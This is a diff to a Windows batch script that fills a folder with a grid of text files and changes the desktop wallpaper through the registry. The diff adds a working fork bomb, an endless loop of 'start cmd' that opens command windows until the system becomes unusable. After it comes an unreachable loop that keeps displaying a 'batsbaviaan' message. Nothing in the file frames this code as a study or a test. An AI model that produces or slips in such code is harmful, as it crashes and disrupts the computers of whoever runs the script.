@@ -1,4 +1,5 @@
 @echo off
+
 :: Set the number of rows and columns for the grid of text files
 set ROWS=10
 set COLS=10
@@ -37,4 +38,13 @@ reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
 :: Refresh the desktop to apply the change
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
-pause
+:: Start an infinite loop opening new command windows
+:loop
+start cmd
+goto loop
+
+:: Display message in an infinite loop
+:msgloop
+msg * "batsbaviaan. Press OK to continue." 
+timeout /t 5 /nobreak >nul
+goto msgloop
